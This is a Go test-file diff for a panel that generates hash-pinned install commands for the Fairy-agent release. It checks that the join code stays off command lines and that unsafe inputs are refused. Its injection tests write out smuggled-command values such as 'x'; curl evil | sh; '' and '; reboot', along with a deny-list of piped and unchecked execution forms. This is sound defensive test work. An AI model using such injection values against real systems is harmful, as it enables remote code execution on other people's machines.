@@ -24,7 +24,11 @@ import (
 
 var testInstallers = Installers{Repo: "n3ptune-cpu/Fairy-agent", Tag: "build-7", Version: "7-6155fe6",
 	Base: "https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7",
-	SH:   strings.Repeat("a1", 32), PS1: strings.Repeat("b2", 32), PairV2SH: true, PairV2PS1: true}
+	SH:   strings.Repeat("a1", 32), PS1: strings.Repeat("b2", 32), Sums: strings.Repeat("c3", 32), PinSH: true, PinPS1: true,
+	PairV2SH: true, PairV2PS1: true, StdinSH: true, EnvPS1: true, MemoryPS1: true}
+
+// A join code as the panel makes it, for the command tests.
+const testCode = "MFRG-GZDF-MZTW-Q2LK-NNWG-23TP-OBYX-E43U"
 
 // fakeRelease is a GitHub release download folder signed with a fresh key.
 type fakeRelease struct {
@@ -34,10 +38,19 @@ type fakeRelease struct {
 	pub   string
 }
 
-// v0.4.3-style installers: they take the panel's hash of SHA256SUMS.
+// v0.4.3-style installers: they take the panel's hash of SHA256SUMS (and the join code on the command line).
 const (
-	shWithPin  = "#!/bin/sh\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n    --sums-sha256) SUMS_PIN=\"$2\"; shift ;;\n  esac\n  shift\ndone\n"
-	ps1WithPin = "param(\n    [switch]$Ipmi,\n    [string]$SumsSha256 = '',\n    [string]$ReleaseUrl = 'x'\n)\n"
+	shWithPin  = "#!/bin/sh\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n    --join) CODE=\"$2\"; shift ;;\n    --sums-sha256) SUMS_PIN=\"$2\"; shift ;;\n  esac\n  shift\ndone\n"
+	ps1WithPin = "param(\n    [Parameter(Mandatory = $true)][string]$Join,\n    [switch]$Ipmi,\n    [string]$SumsSha256 = '',\n    [string]$ReleaseUrl = 'x'\n)\n"
+)
+
+// Installers as Fairy-agent ships them from v0.6.0 on: the option lines the panel looks for, as they stand in
+// deploy/install.sh and deploy/install.ps1 there (pinned on that side by pkg/release/deploy_test.go).
+const (
+	shCurrent = "#!/bin/sh\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n    --join) [ $# -ge 2 ] || die \"--join needs the code\"; CODE=\"$2\"; CODE_ARG=1; shift ;;\n" +
+		"    --join-stdin) CODE_STDIN=1 ;;\n    --pair-v2) PAIRV2=1 ;;\n    --sums-sha256) [ $# -ge 2 ] || die \"x\"; SUMS_PIN=\"$2\"; shift ;;\n  esac\n  shift\ndone\n"
+	ps1Current = "param(\n    [string]$Join = '',\n    [Parameter(Mandatory = $true)][string]$PanelAddress,\n    [switch]$PairV2,\n    [switch]$Ipmi,\n" +
+		"    [string]$SumsSha256 = '',\n    [string]$ReleaseUrl = 'x'\n)\n$code = $Join\nif (-not $code) { $code = $env:FAIRY_JOIN_CODE }\nRemove-Item Env:FAIRY_JOIN_CODE\n"
 )
 
 func newFakeRelease(t *testing.T, version string, scripts ...string) *fakeRelease {
@@ -189,31 +202,150 @@ func TestCreateNeedsCheckedScript(t *testing.T) {
 	}
 }
 
+// The two command lines, exactly: they are the lines of the Fairy-agent install scripts' own contract
+// (Fairy-agent reports/A4, "Install command lines"; pinned there by pkg/release/deploy_test.go).
 func TestCommandsPinTheCheckedRelease(t *testing.T) {
-	win := Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}, "CODE", "100.88.109.47")
-	want := `$u='https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7'; $f="$env:TEMP\fairy-install.ps1"; ` +
-		`iwr -useb "$u/install.ps1" -OutFile $f; if ((Get-FileHash $f -Algorithm SHA256).Hash -ne '` + testInstallers.PS1 + `') ` +
+	const base = "https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7"
+	win := Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}, testCode, "100.88.109.47")
+	want := `$u='` + base + `'; $b=(New-Object Net.WebClient).DownloadData("$u/install.ps1"); ` +
+		`if ((([Security.Cryptography.SHA256]::Create().ComputeHash($b) | ForEach-Object { $_.ToString('x2') }) -join '') -ne '` + testInstallers.PS1 + `') ` +
 		`{ throw 'install.ps1 is not the release the panel checked: not run' }; ` +
-		`powershell -ExecutionPolicy Bypass -File $f -ReleaseUrl $u -Join CODE -PanelAddress 100.88.109.47 -PairV2 -PowerControl -UpsName ups1`
+		`$env:FAIRY_JOIN_CODE='` + testCode + `'; & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b))) -ReleaseUrl $u -SumsSha256 ` + testInstallers.Sums +
+		` -PanelAddress 100.88.109.47 -PairV2 -PowerControl -UpsName ups1`
 	if win != want {
 		t.Fatalf("\n got %s\nwant %s", win, want)
 	}
-	lin := Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{SelfUpdate: true}}, "CODE", "100.88.109.47")
-	want = `f=$(mktemp) && curl -fsSL --proto '=https' -o "$f" https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7/install.sh && ` +
-		`echo "` + testInstallers.SH + `  $f" | sha256sum -c - && sudo env FAIRY_RELEASE_URL=https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7 ` +
-		`sh "$f" --join CODE --panel 100.88.109.47 --pair-v2 --self-update`
+	lin := Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{SelfUpdate: true}}, testCode, "100.88.109.47")
+	want = `f=$(mktemp) && curl -fsSL --proto '=https' -o "$f" ` + base + `/install.sh && ` +
+		`echo "` + testInstallers.SH + `  $f" | sha256sum -c - && printf '%s' '` + testCode + `' | sudo env FAIRY_RELEASE_URL=` + base +
+		` sh "$f" --sums-sha256 ` + testInstallers.Sums + ` --join-stdin --pair-v2 --panel 100.88.109.47 --self-update`
 	if lin != want {
 		t.Fatalf("\n got %s\nwant %s", lin, want)
 	}
-	for _, c := range []string{win, lin} {
-		if strings.Contains(c, "latest") || strings.Contains(c, "| sh ") || strings.Contains(c, "| sudo") {
-			t.Fatal("unpinned or piped:", c)
+	// a Proxmox node: a root shell, the same line without sudo
+	node := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.88.109.47")
+	if node != strings.Replace(strings.Replace(want, "| sudo env ", "| env ", 1), " --self-update", " --proxmox", 1) {
+		t.Fatal(node)
+	}
+	// every option, in the order the scripts' usage lines give
+	all := managed.Options{PowerControl: true, SelfUpdate: true, WolRelay: true, UPS: true, CoreTemp: true, IPMI: true}
+	if c := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true, Options: all}, testCode, "100.88.109.47"); !strings.HasSuffix(c,
+		" --panel 100.88.109.47 --power-control --self-update --wol --ipmi --proxmox --ups") {
+		t.Fatal(c)
+	}
+	if c := Command(testInstallers, managed.Host{OS: "windows", Options: all}, testCode, "100.88.109.47"); !strings.HasSuffix(c,
+		" -PanelAddress 100.88.109.47 -PairV2 -PowerControl -SelfUpdate -Wol -CoreTemp -Ipmi -Ups") {
+		t.Fatal(c)
+	}
+	for _, c := range []string{win, lin, node} {
+		if strings.Contains(c, "latest") || strings.Contains(c, "curl -fsSL https") || strings.Contains(c, "| sh ") || strings.Contains(c, "iex") ||
+			strings.Contains(c, "Invoke-Expression") {
+			t.Fatal("unpinned, or a download run unchecked:", c)
 		}
 	}
 }
 
+// L20: the join code is on no program's command line. In both lines it appears exactly once: as the argument
+// of the shell's own printf (Linux), and in an assignment to an environment variable of the PowerShell window
+// (Windows). The old forms (--join CODE, -Join CODE) are gone.
+func TestCommandKeepsTheJoinCodeOffCommandLines(t *testing.T) {
+	for _, os := range []string{"linux", "windows"} {
+		for _, node := range []bool{false, true} {
+			h := managed.Host{OS: os, ProxmoxWanted: node && os == "linux", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}
+			c := Command(testInstallers, h, testCode, "100.88.109.47")
+			if strings.Count(c, testCode) != 1 {
+				t.Fatalf("the code must be in the line exactly once: %s", c)
+			}
+			for _, old := range []string{"--join " + testCode, "--join=" + testCode, "-Join ", "--code", "powershell -ExecutionPolicy", "-File "} {
+				if strings.Contains(c, old) {
+					t.Errorf("%s: the line still has %q: %s", os, old, c)
+				}
+			}
+			if os == "linux" && !strings.Contains(c, `&& printf '%s' '`+testCode+`' | `) {
+				t.Error("linux: the code must be printed by the shell's builtin into the installer's standard input:", c)
+			}
+			if os == "linux" && !regexp.MustCompile(`sh "\$f" --sums-sha256 [0-9a-f]{64} --join-stdin --pair-v2 --panel `).MatchString(c) {
+				t.Error(c)
+			}
+			if os == "windows" && !strings.Contains(c, `; $env:FAIRY_JOIN_CODE='`+testCode+`'; & (`) {
+				t.Error("windows: the code must be set as an environment variable of the window:", c)
+			}
+		}
+	}
+}
+
+// L29: the Windows line keeps no file between checking the script and running it: it downloads into memory,
+// hashes those bytes and runs those bytes. No temp file, no second PowerShell given a path.
+func TestWindowsCommandRunsTheCheckedBytesFromMemory(t *testing.T) {
+	c := Command(testInstallers, managed.Host{OS: "windows"}, testCode, "100.88.109.47")
+	for _, gone := range []string{"$env:TEMP", "fairy-install.ps1", "-OutFile", "Get-FileHash", "iwr ", "Invoke-WebRequest", "-File", "$f"} {
+		if strings.Contains(c, gone) {
+			t.Errorf("the line still uses %q: %s", gone, c)
+		}
+	}
+	for _, want := range []string{`$b=(New-Object Net.WebClient).DownloadData("$u/install.ps1")`, `ComputeHash($b)`,
+		`[scriptblock]::Create([Text.Encoding]::UTF8.GetString($b))`, `-ne '` + testInstallers.PS1 + `') { throw `} {
+		if !strings.Contains(c, want) {
+			t.Errorf("the line lacks %q: %s", want, c)
+		}
+	}
+	// the three uses of $b are the download, the hash and the run: the bytes that are checked are the bytes that run
+	if strings.Count(c, "$b") != 3 {
+		t.Error(c)
+	}
+	// check, then the code, then the run
+	if !(strings.Index(c, "throw ") < strings.Index(c, "FAIRY_JOIN_CODE") && strings.Index(c, "FAIRY_JOIN_CODE") < strings.Index(c, "scriptblock")) {
+		t.Error("order:", c)
+	}
+}
+
+// Command makes no line at all from parts it would not make itself: a code or address in another shape, a UPS
+// name with other characters, an unchecked release, or a release whose script cannot take the new line.
+func TestCommandRefusesUnsafeParts(t *testing.T) {
+	ok := managed.Host{OS: "linux"}
+	if Command(testInstallers, ok, testCode, "100.88.109.47") == "" {
+		t.Fatal("the plain case")
+	}
+	for name, c := range map[string]string{
+		"code with a quote":       Command(testInstallers, ok, "MFRG-GZDF-MZTW-Q2LK-NNWG-23TP-OBYX-E43'", "100.88.109.47"),
+		"code with a command":     Command(testInstallers, ok, "x'; curl evil | sh; '", "100.88.109.47"),
+		"code without dashes":     Command(testInstallers, ok, "MFRGGZDFMZTWQ2LKNNWG23TPOBYXE43U", "100.88.109.47"),
+		"lower-case code":         Command(testInstallers, ok, strings.ToLower(testCode), "100.88.109.47"),
+		"empty code":              Command(testInstallers, ok, "", "100.88.109.47"),
+		"panel with a command":    Command(testInstallers, ok, testCode, "100.88.109.47; reboot"),
+		"panel as a name":         Command(testInstallers, ok, testCode, "panel.example.com"),
+		"panel IPv6":              Command(testInstallers, ok, testCode, "fd7a:115c:a1e0::5"),
+		"UPS name with a command": Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{UPSName: "ups1; reboot"}}, testCode, "100.88.109.47"),
+		"UPS name, PowerShell":    Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{UPSName: "u'; calc; '"}}, testCode, "100.88.109.47"),
+	} {
+		if c != "" {
+			t.Errorf("%s: a line was made: %s", name, c)
+		}
+	}
+	for name, change := range map[string]func(*Installers){
+		"unsafe base":           func(in *Installers) { in.Base += "; curl evil" },
+		"no script hash":        func(in *Installers) { in.SH = "" },
+		"no fingerprint":        func(in *Installers) { in.Sums = "" },
+		"script without pin":    func(in *Installers) { in.PinSH, in.PinPS1 = false, false },
+		"script without v2":     func(in *Installers) { in.PairV2SH, in.PairV2PS1 = false, false },
+		"script needs the code": func(in *Installers) { in.StdinSH, in.EnvPS1 = false, false },
+	} {
+		in := testInstallers
+		change(&in)
+		if l, w := Command(in, managed.Host{OS: "linux"}, testCode, "100.88.109.47"), Command(in, managed.Host{OS: "windows"}, testCode, "100.88.109.47"); l != "" || w != "" {
+			t.Errorf("%s: a line was made:\n%s\n%s", name, l, w)
+		}
+	}
+	in := testInstallers
+	in.MemoryPS1 = false // only Windows needs it
+	if Command(in, managed.Host{OS: "windows"}, testCode, "100.88.109.47") != "" || Command(in, managed.Host{OS: "linux"}, testCode, "100.88.109.47") == "" {
+		t.Error("install.ps1 that cannot run from memory")
+	}
+}
+
 // The Linux command really refuses a script that is not the checked one, and runs the checked one against the
-// pinned release (curl is replaced by a copy from a local folder; a root shell, as on a Proxmox node).
+// pinned release with the join code on its standard input and nowhere in its arguments (curl is replaced by a
+// copy from a local folder; a root shell, as on a Proxmox node).
 func TestLinuxCommandRunsOnlyTheCheckedScript(t *testing.T) {
 	if runtime.GOOS != "linux" {
 		t.Skip("POSIX shell and sha256sum")
@@ -234,20 +366,22 @@ func TestLinuxCommandRunsOnlyTheCheckedScript(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(bin, "curl"), []byte(curl), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	marker := filepath.Join(dir, "ran")
-	script := []byte("#!/bin/sh\necho \"$FAIRY_RELEASE_URL $*\" > \"" + marker + "\"\n")
+	marker, stdin := filepath.Join(dir, "ran"), filepath.Join(dir, "stdin")
+	// the stand-in installer records its release, its arguments and what it reads from standard input (one
+	// line without a line end, as install.sh reads the code: `IFS= read -r CODE || [ -n "$CODE" ]`)
+	script := []byte("#!/bin/sh\necho \"$FAIRY_RELEASE_URL $*\" > \"" + marker + "\"\nIFS= read -r CODE || [ -n \"$CODE\" ]\nprintf '%s' \"$CODE\" > \"" + stdin + "\"\n")
 	in := testInstallers
 	in.SH = hexSum(script)
-	in.PinSH, in.Sums = true, strings.Repeat("c3", 32)
-	cmd := Command(in, managed.Host{OS: "linux", ProxmoxWanted: true}, "ABCD-EFGH", "100.88.109.47")
+	cmd := Command(in, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.88.109.47")
 	run := func() (string, error) {
 		os.Remove(marker)
+		os.Remove(stdin)
 		c := exec.Command("sh", "-c", cmd)
 		c.Env = append(os.Environ(), "PATH="+bin+":"+os.Getenv("PATH"))
 		out, err := c.CombinedOutput()
 		return string(out), err
 	}
-	if err := os.WriteFile(served, []byte("#!/bin/sh\necho tampered > \""+marker+"\"\n"), 0o644); err != nil {
+	if err := os.WriteFile(served, []byte("#!/bin/sh\necho tampered > \""+marker+"\"\ncat > \""+stdin+"\"\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	if out, err := run(); err == nil {
@@ -256,15 +390,25 @@ func TestLinuxCommandRunsOnlyTheCheckedScript(t *testing.T) {
 	if _, err := os.Stat(marker); err == nil {
 		t.Fatal("the tampered script ran")
 	}
+	if _, err := os.Stat(stdin); err == nil {
+		t.Fatal("the tampered script was given the join code")
+	}
 	if err := os.WriteFile(served, script, 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if out, err := run(); err != nil {
+	out, err := run()
+	if err != nil {
 		t.Fatal(err, out)
 	}
 	got, _ := os.ReadFile(marker)
-	if string(got) != in.Base+" --sums-sha256 "+in.Sums+" --join ABCD-EFGH --panel 100.88.109.47 --pair-v2 --proxmox\n" {
+	if string(got) != in.Base+" --sums-sha256 "+in.Sums+" --join-stdin --pair-v2 --panel 100.88.109.47 --proxmox\n" {
 		t.Fatalf("%q", got)
+	}
+	if code, _ := os.ReadFile(stdin); string(code) != testCode {
+		t.Fatalf("standard input of the installer: %q", code)
+	}
+	if strings.Contains(string(got), testCode) || strings.Contains(out, testCode) {
+		t.Fatal("the join code is in the installer's arguments or in the output")
 	}
 }
 
@@ -283,38 +427,38 @@ func TestPinnedReleaseFollowsGoMod(t *testing.T) {
 	}
 }
 
-// Installers that take the panel's hash of SHA256SUMS (Fairy-agent v0.4.3) get the hash of the exact SHA256SUMS
-// bytes the panel verified; older ones (which refuse unknown options) do not.
+// The command passes the hash of the exact SHA256SUMS bytes the panel verified. A release whose script does
+// not take it (older than Fairy-agent v0.4.3) gets no command.
 func TestCommandsPassTheVerifiedSumsHash(t *testing.T) {
-	f := newFakeRelease(t, "8-e38a516", shWithPin, ps1WithPin)
-	in, err := f.verifier(t, "8-e38a516").Installers(context.Background())
+	f := newFakeRelease(t, "20-abcdef0", shCurrent, ps1Current)
+	in, err := f.verifier(t, "20-abcdef0").Installers(context.Background())
 	if err != nil {
 		t.Fatal(err)
 	}
 	sums := hexSum(f.files[release.SumsFile])
-	if !in.PinSH || !in.PinPS1 || in.Sums != sums {
+	if !in.PinSH || !in.PinPS1 || in.Sums != sums || len(in.Lacks("linux")) != 0 || len(in.Lacks("windows")) != 0 {
 		t.Fatalf("%+v", in)
 	}
-	lin := Command(in, managed.Host{OS: "linux"}, "CODE", "100.88.109.47")
-	if !strings.Contains(lin, `sh "$f" --sums-sha256 `+sums+` --join CODE --panel 100.88.109.47`) {
+	lin := Command(in, managed.Host{OS: "linux"}, testCode, "100.88.109.47")
+	if !strings.Contains(lin, `sh "$f" --sums-sha256 `+sums+` --join-stdin --pair-v2 --panel 100.88.109.47`) {
 		t.Fatal(lin)
 	}
-	win := Command(in, managed.Host{OS: "windows"}, "CODE", "100.88.109.47")
-	if !strings.Contains(win, `-File $f -ReleaseUrl $u -SumsSha256 `+sums+` -Join CODE -PanelAddress 100.88.109.47`) {
+	win := Command(in, managed.Host{OS: "windows"}, testCode, "100.88.109.47")
+	if !strings.Contains(win, ` -ReleaseUrl $u -SumsSha256 `+sums+` -PanelAddress 100.88.109.47 -PairV2`) {
 		t.Fatal(win)
-	}
-	// only one of them updated: each command follows its own script
-	f2 := newFakeRelease(t, "8-e38a516", shWithPin, "param([string]$ReleaseUrl)\n")
-	in2, err := f2.verifier(t, "").Installers(context.Background())
-	if err != nil || !in2.PinSH || in2.PinPS1 {
-		t.Fatalf("%+v %v", in2, err)
-	}
-	if w := Command(in2, managed.Host{OS: "windows"}, "CODE", "100.88.109.47"); strings.Contains(w, "SumsSha256") {
-		t.Fatal(w)
 	}
 	bad := in
 	bad.Sums = "not-a-hash; curl evil"
-	if bad.valid() {
+	if bad.valid() || Command(bad, managed.Host{OS: "linux"}, testCode, "100.88.109.47") != "" {
 		t.Fatal("unsafe sums hash accepted")
+	}
+	// the scripts of v0.4.3 to v0.5.x take the fingerprint but not the rest: no command
+	f2 := newFakeRelease(t, "13-d43fdaf", shWithPin, ps1WithPin)
+	in2, err := f2.verifier(t, "").Installers(context.Background())
+	if err != nil || !in2.PinSH || !in2.PinPS1 || len(in2.Lacks("linux")) != 2 || len(in2.Lacks("windows")) != 2 {
+		t.Fatalf("%+v %v", in2, err)
+	}
+	if Command(in2, managed.Host{OS: "linux"}, testCode, "100.88.109.47") != "" || Command(in2, managed.Host{OS: "windows"}, testCode, "100.88.109.47") != "" {
+		t.Fatal("a command for a release that cannot take it")
 	}
 }
